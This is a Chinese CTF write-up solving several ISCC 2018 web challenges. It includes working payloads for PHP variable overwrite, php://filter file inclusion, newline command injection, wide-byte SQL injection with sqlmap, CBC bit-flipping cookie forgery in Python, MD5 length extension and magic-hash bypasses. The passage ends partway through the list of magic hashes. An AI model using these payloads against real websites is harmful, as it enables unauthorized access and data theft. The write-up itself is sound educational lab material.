title="一切都是套路"></a>一切都是套路</h3><p><strong>HINT：好像有个文件忘记删了</strong></p><p><strong>自己的字典太垃圾，啥也没扫出来，经过一个表哥强大的字典发现扫出了<code>index.php.txt</code>，内容如下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/jkblH5Kk5G.png?imageslim" alt="mark"></p><pre><code>&lt;?phpinclude &quot;flag.php&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)    die(&quot;flag is here&quot;);if (!isset($_POST[&quot;flag&quot;]) )    die($_403);foreach ($_GET as $k =&gt; $v){    $$k = $$v;}foreach ($_POST as $k =&gt; $v){    $$k = $v;}if ( $_POST[&quot;flag&quot;] !== $flag )    die($_403);echo &quot;flag: &quot;. $flag . &quot;\n&quot;;die($_200);?&gt;</code></pre><p><strong>进行一波代码审计发现考察的是php变量覆盖，构造payload</strong><br><code>http://118.190.152.202:8009/index.php?_200=flag</code></p><p><strong>带上POST参数</strong></p><p><code>flag=</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/IdjaIcj9CF.png?imageslim" alt="mark"><br><strong>我来讲解一下详细的过程，首先代码要求必须有POST参数，而且POST参数的参数名必须为flag，这样才可以到变量覆盖的那一步,接着提交GET参数<code>_200=flag</code>,php代码遍历<code>$_GET</code>数组执行的便是<code>$_200=$flag</code>,也就是将变量<code>$flag</code>的值复制给<code>$_200</code>,覆盖原先变量<code>$_200</code>的值,此时变量<code>$_200</code>的值为<code>$flag</code>中的值，接着php遍历$_POST数组，我们提交的POST参数为<code>flag=空(任意值)</code>，于是将POST的值复制给<code>$flag</code>值，覆盖原先的<code>$flag</code>值，<code>$_POST[&quot;flag&quot;]</code>便会和$flag值相等，都为空(任意值)，最后输出变量<code>$_200</code>的值，也就是原先$flag中的flag</strong></p><p><code>flag: ISCC{taolu2333333....}</code></p><h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p><strong>HINT:没过滤好啊</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/8iAckg2jJl.png?imageslim" alt="mark"><br><code>http://118.190.152.202:8008/index.php?f=articles&amp;id=1</code></p><p><strong>一开始以为id参数没过滤好，于是尝试了注入，结果被坑了，原来是f参数没过滤好，存在文件包含，通过文件包含漏洞使用php伪协议读取<code>index.php</code></strong></p><p><code>payload:http://118.190.152.202:8008/index.php?f=PHP://filter/read=convert.base64-encode/resource=index&amp;id=1</code><br><strong>payload中的php要大写，否则会被拦截</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/0EI1Ab470E.png?imageslim" alt="mark"><br><strong>得到一串base64，解码得到源码，源码中有flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/8H5eamIhbg.png?imageslim" alt="mark"><br><code>flag:ISCC{LFIOOOOOOOOOOOOOO}</code></p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/C08eGC3cDg.png?imageslim" alt="mark"><br><strong>要求ip为本机ip，尝试Referer和X-forwarded-For都不行，最后搜索了一番，发现伪造ip还可以用Client-ip</strong></p><p><strong>将ip伪造成127.0.0.1即可</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/kA4aAedK42.png?imageslim" alt="mark"></p><p><code>flag:ISCC{iscc_059eeb8c0c33eb62}</code></p><h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p><strong>HINT:我都过滤了，看你怎么绕。</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/6kbkCADHgl.png?imageslim" alt="mark"><br><strong>看到这样一句话：请ping我的IP 看你会ping通吗</strong></p><p><strong>尝试</strong></p><p><code>http://118.190.152.202:8018/?ip=118.190.152.202</code></p><p><strong>发现可以执行ping命令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/1CA2g26002.png?imageslim" alt="mark"><br><strong>猜测后台php代码应该如下,类似于dvwa中的命令执行</strong></p><p><code>shell_exec( &#39;ping  &#39; . waf($_GET[ip]) )</code><br><strong>尝试在ping命令后执行多条命令，发现<code>&amp;</code>，<code>&amp;&amp;</code>，<code>|</code>都不行，最后测试发现使用<code>%0A</code>可以绕过,读取flag.txt payload</strong></p><p><code>http://118.190.152.202:8018/?ip=www.baidu.com%0Acat%20flag.txt</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/5L8D3L0D46.png?imageslim" alt="mark"><br><strong>读取index.php payload</strong><br><code>http://118.190.152.202:8018/?ip=www.baidu.com%0Acat%20index.php</code><br><strong>可以看到源码里正如我们之前猜测的那样</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/2mDam747m1.png?imageslim" alt="mark"></p><p>请ping我的IP 看你会ping通吗</p><pre><code>PING www.a.shifen.com (180.149.132.151) 56(84) bytes of data.64 bytes from 180.149.132.151: icmp_seq=1 ttl=51 time=23.8 ms--- www.a.shifen.com ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 23.871/23.871/23.871/0.000 ms &apos;&apos;,        &apos;;&apos; =&gt; &apos;&apos;,        &apos;|&apos; =&gt; &apos;&apos;,        &apos;-&apos;  =&gt; &apos;&apos;,        &apos;$&apos;  =&gt; &apos;&apos;,        &apos;(&apos;  =&gt; &apos;&apos;,        &apos;)&apos;  =&gt; &apos;&apos;,        &apos;`&apos;  =&gt; &apos;&apos;,        &apos;||&apos; =&gt; &apos;&apos;,    );    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {        // Windows        $cmd = shell_exec( &apos;ping  &apos; . $target );    }    else {        // *nix        $cmd = shell_exec( &apos;ping  -c 1 &apos; . $target );    }    echo  &quot;{$cmd}&quot;;?&gt;</code></pre><p><strong>当然这到题也有非常规解法，既然要用命令执行去读取flag.txt，不如直接访问网站根目录下的<code>flag.txt</code>就能得到flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/d00m3BBaJA.png?imageslim" alt="mark"><br><code>ISCC{8a8646c7a2fce16b166fbc68ca65f9e4}</code></p><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/9DH41ccHi2.png?imageslim" alt="mark"><br><strong>题目说<code>Please give me username or password!</code></strong></p><p><strong>那在url后添加GET参数username与password</strong><br><code>http://118.190.152.202:8017/?username=&amp;&amp;password=</code></p><p><strong>再查看源代码可以看到html注释里面有个index.php.txt</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/HHEbkm3GJI.png?imageslim" alt="mark"></p><p><strong>访问index.php.txt,发现源代码，又是一道代码审计题</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/G77749Jh9h.png?imageslim" alt="mark"></p><pre><code>&lt;?phperror_reporting(0);$flag = &quot;***********&quot;;    if(isset($_GET[&apos;username&apos;])){    if (0 == strcasecmp($flag,$_GET[&apos;username&apos;])){    $a = fla;    echo &quot;very good!Username is right&quot;;    }    else{    print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;}}elseprint &apos;Please give me username or password!&apos;;if (isset($_GET[&apos;password&apos;])){    if (is_numeric($_GET[&apos;password&apos;])){        if (strlen($_GET[&apos;password&apos;]) &lt; 4){            if ($_GET[&apos;password&apos;] &gt; 999){            $b = g;            print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;;        }else             print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;;        }else        print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;;    }else    print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;;}if ($a.$b == &quot;flag&quot;)    print $flag;?&gt;</code></pre><p><strong>可以看到只要绕过对username和password的过滤便能得到flag</strong></p><p><strong>strcasecmp的绕过可以利用数组，因为php的隐式类型转换的特性，strcasecmp这个函数在比较时会发生隐式类型转换，数组会被转为字符串格式，也就是Array，所以两个字符串不相等，那么该函数就会返回False，又因为将False与0以双等号（不严格的比较）进行比较发生了一次隐私类型转换，所以结果为真，从而绕过，后面要求数字长度小于4且大于999可以用php中的科学计数法绕过,构造payload</strong></p><p><code>http://118.190.152.202:8017/?username[]=&amp;&amp;password=1e9</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/jad86261b6.png?imageslim" alt="mark"><br><code>flag{ISCC2018_Very_GOOD!}</code></p><h3 id="SQL注入的艺术"><a href="#SQL注入的艺术" class="headerlink" title="SQL注入的艺术"></a>SQL注入的艺术</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/CdD15BHHI4.png?imageslim" alt="mark"><br><strong>找到一个可能存在注入的连接</strong><br><code>http://118.190.152.202:8015/index.php?id=1</code></p><p><strong>猜测id参数可能存在注入，加单引号和双引号页面均返回正常并不会报错，于是猜测引号可能被转义了，尝试宽字节注入</strong></p><p><code>http://118.190.152.202:8015/index.php?id=1%df&#39;</code></p><p><strong>发现页面返回不正常</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/8C724Eil08.png?imageslim" alt="mark"><br><strong>and逻辑判断确认存在注入</strong></p><p><code>http://118.190.152.202:8015/index.php?id=1%df&#39; and 1=1%23</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/hACeHiC64h.png?imageslim" alt="mark"><br><code>http://118.190.152.202:8015/index.php?id=1%df&#39; and 1=2%23</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/h6DJ3HlLag.png?imageslim" alt="mark"><br><strong>order by 测试出列数为8，union查询确定出注入回显的位置</strong></p><p><code>http://118.190.152.202:8015/index.php?id=-1%df&#39; union select 1,2,3,4,5,6,7,8%23</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/c4mdGEJk69.png?imageslim" alt="mark"><br><strong>接下来可以union手工注入，也可以用sqlmap跑，sqlmap跑的时候要使用tamper脚本<code>unmagicquotes.py</code>来绕过单引号转义过滤，为了方便直接上sqlmap，获取flag的命令</strong></p><p><code>sqlmap.py -u &quot;http://118.190.152.202:8015/index.php?id=1&#39;&quot; --dump -C &quot;flag&quot; -T &quot;admins&quot; -D &quot;baji&quot; --tamper=&quot;unmagicquotes.py&quot;</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/mGiCmLAl23.png?imageslim" alt="mark"><br><code>flag:Y0u_@@33w_dxxmn_9rf0Od</code></p><h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p><strong>HINT:随意开火</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/j0j6jg0BcB.png?imageslim" alt="mark"><br><strong>这道题一开始就觉得是文件包含，但是使用php协议读文件时发现一直出现File not found，一直不知为何，直到谷歌搜出了<a href="http://www.yqxiaojunjie.com/index.php/archives/27/" title="类似的一道题" target="_blank" rel="external">类似的一道题</a>才找到思路，这里的思路大概一样，只要绕过正则表达式即可，经过模糊测试，发现</strong></p><p><code>http://118.190.152.202:8006/show.php?img=php://filter/convert.base64-encode/resource=1.jpgresource=../flag.php</code><br><strong>可以读到flag.php中的flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/f6GDKF8GmD.png?imageslim" alt="mark"><br><code>flag{1ntere5ting_PHP_Regu1ar_express1onssssss}</code><br><code>http://118.190.152.202:8006/show.php?img=php://filter/convert.base64-encode/resource=1.jpgresource=show.php</code><br><strong>可以读取show.php查看它的过滤</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/0DjH8FE7G9.png?imageslim" alt="mark"></p><pre><code>&lt;?phperror_reporting(0);ini_set(&apos;display_errors&apos;,&apos;Off&apos;);include(&apos;config.php&apos;);$img = $_GET[&apos;img&apos;];if(isset($img) &amp;&amp; !empty($img)){    if(strpos($img,&apos;jpg&apos;) !== false)    {        if(strpos($img,&apos;resource=&apos;) !== false &amp;&amp;preg_match(&apos;/resource=.*jpg/i&apos;,$img) === 0)        {            die(&apos;File not found.&apos;);        }        preg_match(&apos;/^php:\/\/filter.*resource=([^|]*)/i&apos;,trim($img),$matches);        if(isset($matches[1]))        {            $img = $matches[1];        }        header(&apos;Content-Type: image/jpeg&apos;);        $data = get_contents($img);        echo $data;    }    else    {        die(&apos;File not found.&apos;);    }}else{    ?&gt;    &lt;img src=&quot;1.jpg&quot;&gt;    &lt;?php}?&gt;</code></pre><p><strong>可以看到源码印证了我们之前的猜想</strong></p><h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p><strong>打开后是一个登陆页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180508/2FHFaBllla.png?imageslim" alt="mark"><br><strong>出于习惯首先查看源代码，结果发现泄露了index.php的源码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180508/cd755b6fif.png?imageslim" alt="mark"><br><strong>查看源代码，可以看出又是一道代码审计题</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180508/3a2cLcLmed.png?imageslim" alt="mark"><br><strong>代码如下</strong></p><pre><code>&lt;?phpinclude &apos;sqlwaf.php&apos;;define(&quot;SECRET_KEY&quot;, &quot;................&quot;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();    function get_random_iv(){    $iv=&apos;&apos;;    for($i=0;$i&lt;16;$i++){        $iv.=chr(rand(1,255));    }    return $iv;}function login($info){    $iv=get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];    setcookie(&quot;iv&quot;, base64_encode($iv));    setcookie(&quot;cipher&quot;, base64_encode($cipher));}function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;){        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;        echo &apos;&lt;p&gt;Flag is *************&lt;/p&gt;&apos;;    }else{        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;    }    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;    die();}function check_login(){    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;])){        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];        }else{            die(&quot;ERROR!&quot;);        }    }}    if (isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;])) {  $username=waf((string)$_POST[&apos;username&apos;]);  $password=waf((string)$_POST[&apos;password&apos;]);  if($username === &apos;admin&apos;){        exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;);    }else{        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);        login($info);        show_homepage();    }}else{  if(isset($_SESSION[&quot;username&quot;])){        check_login();        show_homepage();    }}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; &gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;Paper login form&lt;/title&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;login&quot;&gt;  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;    &lt;h1&gt;Sign In&lt;/h1&gt;    &lt;input name=&apos;username&apos; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;    &lt;input name=&apos;password&apos; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;    &lt;button&gt;Sign in&lt;/button&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>来看代码的主要执行过程与用户数据流的流向</strong></p><p><strong>首先，如果存在有用户<code>POST</code>传递过来的<code>username</code>与<code>password</code>，那就接收用户输入的<code>username</code>与<code>password</code>，将用户输入的内容转换为字符串类型然后带入waf函数进行过滤检查处理（应该是过滤一些危险字符），之后使用<code>===</code>检查<code>username</code>的值是否为<code>admin</code>，如果相等直接输出<code>You are not real admin!</code>到页面并且结束，否则将<code>username</code>与<code>password</code>存入数组然后带入login函数，通过代码可以看出login函数的主要作用，将传入的存有<code>username</code>与<code>password</code>的数组进行序列化处理后再使用php中的<code>openssl_encrypt</code>函数进行<code>aes-128-cbc</code>加密，加密的初始化向量为随机生成的16字节的字符串，之后将传入的用户名传入服务器中session文件（文件名为<code>28r835361idfvf2g5judamo844</code>）中的<code>username</code>变量中，将初始化向量与加密结果进行base64编码后分别存入cookie中的<code>iv</code>与<code>cipher</code>中，之后cookie就作为该用户的登陆凭证，简单来说，就是如果用户名不等于<code>admin</code>就登陆成功并且将用户名存入服务器的session变量中，之后setcookie，然后进入用户界面，此处使用<code>show_homepage</code>函数判断，这个函数会判断<code>session</code>中的<code>username</code>是否为<code>admin</code>，如果为<code>admin</code>，那就登陆成功并输出flag，否则就以普通用户登录</strong></p><p><strong>如果发现服务器session文件中的username变量已被设置，说明之前有用户登录了，就不使用login函数进行进行登陆检查，而是使用<code>check_login</code>函数进行用户身份检查，通过代码可以看出<code>check_login</code>函数的主要作用，检查cookie中是否设置有<code>cipher</code>和<code>iv</code>，如果有，就对cookie中的<code>cipher</code>与<code>iv</code>进行base64解码，然后使用php中的<code>openssl_decrypt</code>函数进行<code>aes-128-cbc</code>解密，将解密的结果进行反序列化处理为数组，之后将数组中的<code>username</code>赋值给<code>session</code>中的<code>username</code>，之后进入用户登录界面，再次调用<code>show_homepage</code></strong></p><p><strong>来分析一下整个逻辑过程</strong></p><p><strong>简单来说，要求输入的用户名不能为<code>admin</code>才能登陆成功，但是进行用户身份检查时需要<code>$_SESSION</code>中的<code>username</code>必须等于<code>admin</code>才能登陆成功，于是想到了可以首先以一个用户名不是<code>admin</code>的用户登录，设置<code>$_SESSION[&#39;username&#39;]</code>，之后刷新登陆页面，将会带上生成的cookie进入<code>check_login</code>函数,我们可以修改cookie中的cipher与iv，使其经过aes-128-cbc解密反序列化后将<code>$info[&#39;username&#39;]</code>的值变为<code>admin</code>即可覆盖第一次登陆后设置的<code>$_SESSION[&#39;name&#39;]</code>，将其变为<code>admin</code>,此时经过<code>show_homepage</code>后就会是<code>admin</code>并且输出flag</strong></p><p><strong>在这里加密解密的密钥是未知的，iv初始化向量是随机生成的，导致我们不能直接利用加密算法生成cookie，于是想到了一种名为<a href="http://blog.leej.me/2017/05/15/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81CBC%E5%8A%A0%E5%AF%86%E7%BC%BA%E9%99%B7/" title="CBC翻转字节攻击" target="_blank" rel="external">CBC翻转字节攻击</a>的方法，该攻击可以在不知道密钥的前提下，通过修改密文中某一处的字节达到修改部分明文的目的，具体过程如下，首先来看AES的CBC模式的加密解密过程，分组长度为16字节</strong></p><p><strong>加密</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/5DL0a7l7mC.jpg?imageslim" alt="mark"><br><strong>解密</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/K4KH31g4fJ.jpg?imageslim" alt="mark"><br><strong>所谓的CBC翻转字节攻击就是通过修改某一分组的密文，去修改其下一分组的明文</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/j3aiLD6Aaf.png?imageslim" alt="mark"><br><strong>比如明文分组如下，以题目举例</strong></p><pre><code>a:2:{s:8:&quot;username&quot;;s:5:&quot;Admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;}</code></pre><p><strong>要将<code>Admin</code>修改为<code>admin</code>，只需修改加密后第一个分组中的第10个字节，也就是对应<code>A</code>所在位置的<code>&quot;</code>的密文就可以</strong></p><p><strong>首先要以Admin登陆，获取Set-Cookie中的cipher与iv，cipher里面存放着将上面那串字符串加密的密文，iv为随机生成的16位字符串，作为加密解密的初始化向量</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/mmBJ5lGEJB.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/E46C9Ce2i8.png?imageslim" alt="mark"></p><pre><code>iv：pO%2FPPYF9sNQq9oGENmDdFA%3D%3Dcipher：bq1cO9PgjsrNX%2B1iItSFPsyT%2Ftaue76NjOh1oAZOMHsVI74GT7iCFIeGBksNNh%2B7%2FDu5pSgPzuq339vT4EWNfQ%3D%3D</code></pre><p><strong>首先修改密文的第一个分组的第十个字节</strong></p><pre><code>import urllibimport base64#a:2:{s:8:&quot;userna#me&quot;;s:5:&quot;Admin&quot;;#s:8:&quot;password&quot;;s#:6:&quot;123456&quot;;}cipher=&quot;bq1cO9PgjsrNX%2B1iItSFPsyT%2Ftaue76NjOh1oAZOMHsVI74GT7iCFIeGBksNNh%2B7%2FDu5pSgPzuq339vT4EWNfQ%3D%3D&quot;cipher=base64.b64decode(urllib.unquote(cipher))newcipher=cipher[0:9]+chr(ord(cipher[9])^ord(&apos;A&apos;)^ord(&apos;a&apos;))+cipher[10:]print &quot;cipher:\n%s&quot;%(urllib.quote(base64.b64encode(cipher)))print &quot;new cipher:\n%s&quot;%(urllib.quote(base64.b64encode(newcipher)))</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/m1eaF1BI4h.png?imageslim" alt="mark"><br><strong>我来解释一下这段代码</strong></p><pre><code>首先需要明白一个前提异或运算相同为0，不同为1，所以推导出：一个字符和其本身异或结果为0，一个字符和0异或结果为其本身解密（cipher[9+16]）^cipher[9]=&apos;A&apos;(这是正常的解密过程)解密（cipher[9+16]）^cipher[9]^&apos;A&apos;^&apos;a&apos;=&apos;a&apos;（将A变为a，就要将第一分组中的第十个字节cipher[9]进行cipher[9]^&apos;A&apos;^&apos;a&apos;改变）</code></pre><p><strong>此时cipher变为了</strong></p><pre><code>bq1cO9PgjsrNf%2B1iItSFPsyT/taue76NjOh1oAZOMHsVI74GT7iCFIeGBksNNh%2B7/Du5pSgPzuq339vT4EWNfQ%3D%3D</code></pre><p><strong>刷新登陆后的页面，将cookie中的cipher改为修改后的cipher</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/KKD543a6Hf.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/IKkhEdf592.png?imageslim" alt="mark"><br><strong>将返回<code>base64_decode(&#39;sMqpNX2y/F9xcy6m4U9Nsm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6IjEyMzQ1NiI7fQ==&#39;) can&#39;t unserialize</code>的错误，因为如果修改第一组密文中的某个字节，初始化向量不变也会导致第一组明文解密时发生改变，从而导致解密出的序列化的格式发生改变而导致反序列化失败，所以还要根据这串返回的base64重新生成新的iv，让解密出的第一个分组的明文还原成原先的明文</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/2c03bBEIIF.png?imageslim" alt="mark"></p><pre><code>import urllibimport base64iv=&quot;pO%2FPPYF9sNQq9oGENmDdFA%3D%3D&quot;iv=base64.b64decode(urllib.unquote(iv))jiamingwen = base64.b64decode(urllib.unquote(&apos;sMqpNX2y/F9xcy6m4U9Nsm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6IjEyMzQ1NiI7fQ==&apos;))mingwen = &apos;a:2:{s:8:&quot;userna&apos;newiv = &apos;&apos;for i in range(0,16):    newiv += chr(ord(mingwen[i])^ord(jiamingwen[i])^ord(iv[i])) print urllib.quote(base64.b64encode(newiv))</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/1KemB4cciD.png?imageslim" alt="mark"><br><strong>同样的，解释一下这段代码</strong></p><pre><code>有个前提如果c=a^b那么a=c^b，b=a^c    因为：iv^解密（假密文）=假明文iv^解密（假密文）^假明文=0(假明文^假明文=0)所以：iv^解密（假密文）^假明文^明文=明文（0^明文=明文）又因为需要达到：newiv^解密（假密文）=明文所以：newiv=iv^假明文^明文    </code></pre><p><strong>所以新的iv变为</strong></p><pre><code>dR9UMoe8drNhp9pRsl3%2Bxw%3D%3D</code></pre><p><strong>然后将cookie中的cipher和iv同时改为新生成的即可，这样的话解密后只会将第二组明文的<code>A</code>变为<code>a</code>，而且第一分组解密出的明文并不会发生改变，序列化格式也自然不会改变，这样就可以反序列化成功，然后将<code>$_SESSION[&#39;username&#39;]</code>重新赋值为解密出的<code>admin</code>明文,然后绕过验证输出flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/CKJ6Dcd12A.png?imageslim" alt="mark"></p><pre><code>flag：ISCC{123dasd89as10aas}</code></pre><h2 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h2><p><strong>HINT：那么长的秘钥，要爆破到什么时候啊</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/L8D33j2aBJ.png?imageslim" alt="mark"><br><strong>又是一到代码审计题</strong></p><pre><code>&lt;?phpinclude &quot;secret.php&quot;;@$username=(string)$_POST[&apos;username&apos;];function enc($text){    global $key;    return md5($key.$text);}if(enc($username) === $_COOKIE[&apos;verify&apos;]){    if(is_numeric(strpos($username, &quot;admin&quot;))){        die($flag);    }    else{        die(&quot;you are not admin&quot;);    }}else{    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);}show_source(__FILE__);</code></pre><p><strong>可以看出这道题是考察hash长度扩展攻击的，对于这种攻击方式原理自己还没有完全搞懂，于是就把做题方法记录一下</strong></p><p><strong>首先，需要在linux中安装一个名为HashPump的工具，HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。下面是安装方法</strong></p><pre><code>git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/djl8cGgHb7.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/h9K28hGb3B.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/EK41J2h9cF.png?imageslim" alt="mark"></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/2a476FI9DG.png?imageslim" alt="mark"><br><strong>之后POST提交username为guest，运行hashpump，将burp抓包抓到的cookie中的verify与len输入，然后输入数据和要追加的数据（guest与admin）</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/4f00bhjilb.png?imageslim" alt="mark"><br><strong>之后便会生成新的数据与hash值，分别将username与cookie中的verify改为hashpump新生成的值即可</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/IIa4EJkA21.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/E5EjHdh6h3.png?imageslim" alt="mark"></p><pre><code>flag：ISCC{MD5_1s_n0t_5afe}</code></pre><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/4C6ld3If9m.png?imageslim" alt="mark"><br><strong>打开后可以看到代码如下</strong></p><pre><code>&lt;html&gt;&lt;body&gt;&lt;form action=&quot;md5.php&quot;  method=&quot;post&quot; &gt;    用户名:&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;    密码:&lt;input type=&quot;password&quot; name =&quot;password&quot;/&gt;    &lt;input type=&quot;submit&quot; &gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);if(isset($_POST[&apos;username&apos;])&amp;isset($_POST[&apos;password&apos;])){    $username = $_POST[&apos;username&apos;];    $password = $_POST[&apos;password&apos;];}else{    $username=&quot;hello&quot;;    $password=&quot;hello&quot;;}if(md5($password) == 0){    echo &quot;xxxxx&quot;;}show_source(__FILE__);?&gt;</code></pre><p><strong>这里考察php的隐式类型转换，如果用双等号将一个字符串与数字进行比较时，会将字符串类型转为数字类型，所以在这里一般可以利用开头为0的MD5值绕过，以下列举了一些MD5后开头为0的字符串</strong></p><pre><code>QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e34276841682245152497411725